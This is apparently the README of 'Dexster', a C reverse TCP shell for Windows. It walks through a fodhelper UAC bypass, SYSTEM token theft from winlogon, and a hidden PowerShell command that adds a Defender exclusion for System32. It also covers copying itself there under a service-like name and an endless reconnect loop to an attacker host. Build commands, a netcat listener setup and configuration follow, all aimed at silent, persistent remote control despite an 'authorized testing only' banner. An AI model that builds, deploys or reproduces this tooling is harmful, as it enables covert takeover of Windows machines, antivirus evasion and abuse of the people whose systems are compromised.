<div align="center">
<br/>
<br/>

<pre>
██████╗ ███████╗██╗  ██╗███████╗████████╗███████╗██████╗ 
██╔══██╗██╔════╝╚██╗██╔╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗
██║  ██║█████╗   ╚███╔╝ ███████╗   ██║   █████╗  ██████╔╝
██║  ██║██╔══╝   ██╔██╗ ╚════██║   ██║   ██╔══╝  ██╔══██╗
██████╔╝███████╗██╔╝ ██╗███████║   ██║   ███████╗██║  ██║
╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝
</pre>

<h3>⚡ Reverse TCP Shell &nbsp;·&nbsp; Windows Edition &nbsp;·&nbsp; <code>v1</code></h3>
<p><em>From a regular user to <strong>NT AUTHORITY\SYSTEM</strong> — silently, automatically, no prompts.</em></p>

<br/>

<img src="https://img.shields.io/badge/Language-C-A8B9CC?style=for-the-badge&logo=c&logoColor=white"/>
&nbsp;
<img src="https://img.shields.io/badge/Platform-Windows%20x64-0078D4?style=for-the-badge&logo=windows&logoColor=white"/>
&nbsp;
<img src="https://img.shields.io/badge/Privilege-NT%20AUTHORITY%5C%5CSYSTEM-DC143C?style=for-the-badge&logo=windows-terminal&logoColor=white"/>
&nbsp;
<img src="https://img.shields.io/badge/Shell-PowerShell-5391FE?style=for-the-badge&logo=powershell&logoColor=white"/>
&nbsp;
<img src="https://img.shields.io/badge/UAC-Bypassed-FF6B35?style=for-the-badge&logo=shield&logoColor=white"/>
&nbsp;
<img src="https://img.shields.io/badge/Use-Authorized%20Testing%20Only-FFA500?style=for-the-badge"/>

<br/><br/>

<table>
<tr>
<td align="center">🔓<br/><strong>UAC Bypass</strong><br/><sub>fodhelper technique</sub></td>
<td align="center">🎭<br/><strong>Token Steal</strong><br/><sub>winlogon impersonation</sub></td>
<td align="center">🛡️<br/><strong>AV Evasion</strong><br/><sub>Defender exclusion</sub></td>
<td align="center">🔁<br/><strong>Auto Reconnect</strong><br/><sub>infinite retry loop</sub></td>
<td align="center">👻<br/><strong>Fully Hidden</strong><br/><sub>no window, no trace</sub></td>
</tr>
</table>

<br/>

</div>

> [!CAUTION]
> **For AUTHORIZED penetration testing and security research ONLY.**
> Using this against systems you do not own or lack explicit written permission to test is a **criminal offence** in most jurisdictions.

<br/>

---

<br/>

<p align="center">
  <a href="#-what-is-a-reverse-shell"><b>What is a Reverse Shell?</b></a> &nbsp;·&nbsp;
  <a href="#-files"><b>Files</b></a> &nbsp;·&nbsp;
  <a href="#-privilege-chain"><b>Privilege Chain</b></a> &nbsp;·&nbsp;
  <a href="#%EF%B8%8F-how-it-works"><b>How It Works</b></a> &nbsp;·&nbsp;
  <a href="#%EF%B8%8F-building"><b>Building</b></a> &nbsp;·&nbsp;
  <a href="#-usage"><b>Usage</b></a> &nbsp;·&nbsp;
  <a href="#-listener-setup"><b>Listener</b></a> &nbsp;·&nbsp;
  <a href="#%EF%B8%8F-configuration"><b>Config</b></a> &nbsp;·&nbsp;
  <a href="#-full-execution-flow"><b>Summary</b></a>
</p>

<br/>

---

<br/>

## 💡 What is a Reverse Shell?

A **reverse shell** inverts the traditional attacker → target connection. Instead, the **target reaches out to the attacker**. This sails past most corporate firewalls and NAT configurations since outbound TCP is almost never blocked.

<br/>

<div align="center"><pre>
  ╔═══════════════════════════╗         TCP Handshake          ╔═══════════════════════════╗
  ║      TARGET MACHINE       ║  ──────────────────────────▶  ║     ATTACKER MACHINE      ║
  ║                           ║                               ║                           ║
  ║   reverse_shell.exe       ║◀─ ─ ─ ─PowerShell I/O─ ─ ─ ─║   nc -lvnp <PORT>         ║
  ║   (running as SYSTEM)     ║                               ║   (full shell access)     ║
  ╚═══════════════════════════╝                               ╚═══════════════════════════╝
</pre></div>

<br/>

---

<br/>

## 📁 Files

<div align="center">

| &nbsp; | File | Description |
|:---:|:---|:---|
| 🔴 | `reverse_shell_system.c` | **Main payload** — UAC bypass + SYSTEM escalation + shell loop |
| 📄 | `manifest.xml` | Windows application manifest — execution level set to `asInvoker` |
| 🔧 | `manifest.rc` | Resource script — embeds the manifest into the compiled binary |

</div>

<br/>

---

<br/>

## 🔑 Privilege Chain

<br/>

<div align="center"><pre>
  ╔══════════════════════════════════════════════════════╗
  ║    👤  Regular User  (medium integrity)              ║
  ║        — standard desktop session                    ║
  ╚══════════════════════╤═══════════════════════════════╝
                         │
                         │   🔓  fodhelper UAC Bypass
                         │       ✦ Writes HKCU registry key
                         │       ✦ Launches fodhelper.exe (auto-elevated)
                         │       ✦ fodhelper re-executes us as Admin
                         │       ✦ Zero prompts shown to user
                         ▼
  ╔══════════════════════════════════════════════════════╗
  ║    🔐  Administrator  (high integrity)               ║
  ║        — elevated token, UAC bypassed                ║
  ╚══════════════════════╤═══════════════════════════════╝
                         │
                         │   🎭  Token Impersonation
                         │       ✦ Enable SeDebugPrivilege
                         │       ✦ Open winlogon.exe (always SYSTEM)
                         │       ✦ Steal + duplicate its token
                         │       ✦ Spawn processes under that token
                         ▼
  ╔══════════════════════════════════════════════════════╗
  ║  🔴  NT AUTHORITY\SYSTEM  (highest on Windows)      ║
  ║      — above Admin, no restrictions                  ║
  ║      — can access SAM, LSA, any process              ║
  ╚══════════════════════════════════════════════════════╝
</pre></div>

<br/>

---

<br/>

## ⚙️ How It Works

<br/>

<details>
<summary><h3>&nbsp;🔓 &nbsp;Stage 1 &nbsp;—&nbsp; UAC Bypass &nbsp;<code>fodhelper technique</code></h3></summary>

<br/>

> **Goal:** Elevate from a standard user to Admin **without showing any UAC prompt.**

**The attack surface:** `fodhelper.exe` is a Microsoft-signed Windows binary marked `autoElevate: true` in its own manifest. When launched, Windows silently elevates it — no prompt. Before opening its UI, `fodhelper` checks a user-writable registry key for a command to run:

```
HKCU\Software\Classes\ms-settings\Shell\Open\command
    (Default)        = "C:\path\to\our\exe.exe"
    DelegateExecute  = ""             ← must exist to trigger the hijack
```

**Execution flow:**

<div align="center"><pre>
① GetModuleFileNameA()  →  get our own full path
         │
② RegCreateKeyExA()     →  create the ms-settings key in HKCU
         │
③ RegSetValueExA()      →  write our quoted exe path as default value
         │                  (quoted to handle paths with spaces)
④ RegSetValueExA()      →  write empty DelegateExecute value
         │
⑤ ShellExecuteA("open", "fodhelper.exe")
         │                  Windows auto-elevates fodhelper (no UAC prompt)
         │                  fodhelper reads the key → executes our exe as Admin
         │
⑥ Sleep(2000)           →  give elevated child time to start
         │
⑦ RegDeleteTreeA()      →  wipe the ms-settings key (clean exit, no evidence)
         │
⑧ ExitProcess(0)        →  non-elevated instance is done
</pre></div>

> **Why `asInvoker` in the manifest?**
> A `requireAdministrator` manifest causes Windows to show a UAC prompt *before the binary runs* — killing the entire bypass. `asInvoker` starts the exe as a normal user, letting the bypass code handle elevation entirely in software.

> **Requirement:** Target user must be a member of the local **Administrators group**. This bypasses the *prompt* — not the group membership check.

<br/>

</details>

---

<details>
<summary><h3>&nbsp;🔑 &nbsp;Stage 2 &nbsp;—&nbsp; Enable <code>SeDebugPrivilege</code></h3></summary>

<br/>

> **Goal:** Unlock the ability to open handles to processes owned by other users — including SYSTEM.

Every Admin process has `SeDebugPrivilege` **assigned but disabled** by default. Without enabling it, `OpenProcess` on any SYSTEM-owned process (like `winlogon.exe`) returns `ERROR_ACCESS_DENIED`.

```c
OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES, &token);
LookupPrivilegeValue(NULL, "SeDebugPrivilege", &luid);
AdjustTokenPrivileges(token, FALSE, &tp, ...);
// → SeDebugPrivilege is now ENABLED
// → OpenProcess on ANY pid now succeeds
```

<br/>

</details>

---

<details>
<summary><h3>&nbsp;🎭 &nbsp;Stage 3 &nbsp;—&nbsp; SYSTEM Token Impersonation</h3></summary>

<br/>

> **Goal:** Obtain a usable `NT AUTHORITY\SYSTEM` token from a process that already runs as SYSTEM.

`winlogon.exe` is always running as SYSTEM. We reach in, copy its token, and make it usable for spawning new processes:

<div align="center"><pre>
CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS)
        │
        ▼  enumerate all processes
    find "winlogon.exe"  →  get PID
        │
        ▼
OpenProcess(PROCESS_QUERY_INFORMATION, winlogon_pid)
        │
        ▼
OpenProcessToken(proc, TOKEN_DUPLICATE | TOKEN_QUERY)
        │
        ▼
DuplicateTokenEx(
    token,
    TOKEN_ALL_ACCESS,
    NULL,
    SecurityImpersonation,
    TokenPrimary,          ←  PRIMARY required for CreateProcessWithTokenW
    &dup_token
)
        │
        ▼
   dup_token = fully usable SYSTEM token  ✓
</pre></div>

<br/>

</details>

---

<details>
<summary><h3>&nbsp;🛡️ &nbsp;Stage 4 &nbsp;—&nbsp; SYSTEM-Only Setup &nbsp;<sub>(runs once, skipped if token is NULL)</sub></h3></summary>

<br/>

> **Goal:** Blind Defender and plant the payload in a trusted system location.

**① Defender Exclusion** *(PowerShell, hidden, running as SYSTEM)*

```powershell
Add-MpPreference -ExclusionPath "C:\Windows\System32"
```

Adds `C:\Windows\System32` to Windows Defender's exclusion list — Defender will **not scan, flag, or quarantine** any file placed there. Waits 1.5 seconds for the exclusion to take effect.

**② Self-Copy into System32**

<div align="center"><pre>
&lt;current exe path&gt;
        │
        ▼
C:\Windows\System32\WindowsHostService.exe
</pre></div>

Drops a copy under a name that blends in with legitimate Windows services. Overwrites if already present.

<br/>

</details>

---

<details>
<summary><h3>&nbsp;🔁 &nbsp;Stage 5 &nbsp;—&nbsp; Infinite Reconnect Loop</h3></summary>

<br/>

> **Goal:** Maintain persistent access — reconnect automatically whenever the connection drops.

<div align="center"><pre>
┌─────────────────────────────────────────────────────┐
│              RECONNECT LOOP  (∞)                    │
│                                                     │
│  sock = connect(DEFAULT_HOST, DEFAULT_PORT)         │
│                                                     │
│  ┌── Connection FAILED ──────────────────────────┐  │
│  │   sleep(RETRY_DELAY_MS)  →  retry             │  │
│  └───────────────────────────────────────────────┘  │
│                                                     │
│  ┌── Connection SUCCESS ─────────────────────────┐  │
│  │                                               │  │
│  │   if (system_token valid):                    │  │
│  │       CreateProcessWithTokenW(system_token)   │  │
│  │       → Shell runs as NT AUTHORITY\SYSTEM 🔴  │  │
│  │                                               │  │
│  │   else (fallback):                            │  │
│  │       CreateProcessA("powershell.exe ...")    │  │
│  │       → Shell runs as Administrator  🟠       │  │
│  │                                               │  │
│  │   stdin / stdout / stderr  ←→  socket         │  │
│  │   WaitForSingleObject → shell exits → loop    │  │
│  └───────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────┘
</pre></div>

PowerShell is spawned with `CREATE_NO_WINDOW | SW_HIDE` — completely invisible to anyone on the machine.

<br/>

</details>

<br/>

---

<br/>

## 🛠️ Building

<br/>

> **Requirements:** [MSYS2](https://www.msys2.org/) with `mingw-w64` toolchain — provides both `gcc` and `windres`.

<br/>

```bash
# Step 1 — compile the manifest resource
windres manifest.rc -o manifest.o

# Step 2 — compile and link the final binary
gcc reverse_shell_system.c manifest.o -o reverse_shell_system.exe -lws2_32 -ladvapi32 -lshell32 -mwindows
```

<br/>

<div align="center">

| Flag | Links Against | Why It's Needed |
|:---:|:---|:---|
| `-lws2_32` | `ws2_32.dll` | All Winsock2 socket functions (`WSASocket`, `connect`, `send`, etc.) |
| `-ladvapi32` | `advapi32.dll` | Registry, tokens, privileges (`OpenProcessToken`, `AdjustTokenPrivileges`) |
| `-lshell32` | `shell32.dll` | `ShellExecuteA` — only API that can launch auto-elevating binaries |
| `-mwindows` | — | GUI subsystem — **no console window spawns at any point** |

</div>

<br/>

---

<br/>

## 🚀 Usage

<br/>

**Default** *(host + port hardcoded in source):*

```powershell
.\reverse_shell_system.exe
```

**Custom host and port:**

```powershell
.\reverse_shell_system.exe <ATTACKER_IP_OR_HOST> <PORT>
```

> [!NOTE]
> No arguments needed for normal use — host and port are compiled in via `#define` at the top of the source file.

<br/>

---

<br/>

## 📡 Listener Setup

<br/>

> Start your listener **before** running the payload. The target connects back on launch.

```bash
# netcat
nc -lvnp <PORT>

# ncat (Nmap — recommended)
ncat -lvnp <PORT>
```

<br/>

**Verify privilege on connection:**

```powershell
whoami
# nt authority\system

whoami /priv
# All privileges listed — SeDebugPrivilege, SeTcbPrivilege, etc.

whoami /groups
# NT AUTHORITY\SYSTEM, BUILTIN\Administrators, ...
```

<br/>

---

<br/>

## ⚙️ Configuration

<br/>

Edit these defines at the top of `reverse_shell_system.c` before compiling:

<br/>

<div align="center">

| `#define` | Default Value | What It Controls |
|:---:|:---|:---|
| `DEFAULT_HOST` | `example.host.of.yours` | Attacker IP or hostname to connect back to |
| `DEFAULT_PORT` | `12345` | TCP port of the attacker's listener |
| `RETRY_DELAY_MS` | `2000` | Milliseconds to wait between reconnect attempts |
| `MAX_RETRIES` | `0` | `0` = retry forever &nbsp;·&nbsp; `N` = give up after N failures |

</div>

<br/>

---

<br/>

## 📊 Full Execution Flow

<br/>

<div align="center"><pre>
  double-click  reverse_shell_system.exe
  (runs as regular user — no prompt shown)
          │
          ▼
  ┌─────────────────────────────────────────────────────────────────┐
  │  🔓  STAGE 1 · UAC BYPASS                                      │
  │                                                                 │
  │  already admin? ──YES──▶ skip to Stage 2                       │
  │       │ NO                                                      │
  │       ▼                                                         │
  │  write HKCU ms-settings registry key                           │
  │  ShellExecuteA("fodhelper.exe")                                 │
  │  → Windows auto-elevates fodhelper (no prompt)                 │
  │  → fodhelper re-launches us as Admin ──────────────────────┐   │
  │  sleep 2s → wipe registry key → ExitProcess(0)             │   │
  └─────────────────────────────────────────────────────────────┘   │
                                                                    │
  ┌─────────────────────────────────────────────────────────────────▼─┐
  │  🔑  STAGE 2 · SeDebugPrivilege                                   │
  │  AdjustTokenPrivileges → privilege enabled                         │
  └──────────────────────────────────────────────┬────────────────────┘
                                                 │
  ┌──────────────────────────────────────────────▼────────────────────┐
  │  🎭  STAGE 3 · TOKEN STEAL                                        │
  │  find winlogon.exe → OpenProcess → DuplicateTokenEx               │
  │  result: PRIMARY SYSTEM token (or NULL if failed)                  │
  └──────────────────────────────────────────────┬────────────────────┘
                                                 │
  ┌──────────────────────────────────────────────▼────────────────────┐
  │  🛡️  STAGE 4 · SYSTEM SETUP  (only if token ≠ NULL)              │
  │                                                                    │
  │  ① PowerShell (SYSTEM, hidden):                                   │
  │     Add-MpPreference -ExclusionPath "C:\Windows\System32"          │
  │     Sleep 1500ms                                                   │
  │                                                                    │
  │  ② CopyFileA:                                                      │
  │     this exe → C:\Windows\System32\WindowsHostService.exe          │
  └──────────────────────────────────────────────┬────────────────────┘
                                                 │
  ┌──────────────────────────────────────────────▼────────────────────┐
  │  🔁  STAGE 5 · RECONNECT LOOP  (∞)                               │
  │                                                                    │
  │  loop:                                                             │
  │    connect(HOST, PORT)                                             │
  │      ✓ success + SYSTEM token → PowerShell as SYSTEM  🔴          │
  │      ✓ success + no token    → PowerShell as Admin    🟠          │
  │      ✗ fail                  → sleep 2s, retry        🔄          │
  └────────────────────────────────────────────────────────────────────┘
</pre></div>

<br/>

---

<br/>

<div align="center">

<img src="https://img.shields.io/badge/Built%20with-C-A8B9CC?style=flat-square&logo=c"/>
&nbsp;
<img src="https://img.shields.io/badge/Target-Windows%2010%2F11-0078D4?style=flat-square&logo=windows"/>
&nbsp;
<img src="https://img.shields.io/badge/Compiler-MinGW--w64-FF6B35?style=flat-square"/>

<br/><br/>

<em>Dexster &nbsp;·&nbsp; Reverse TCP Shell &nbsp;·&nbsp; v1 &nbsp;·&nbsp; Built in C &nbsp;❤️</em>

<br/>

</div>
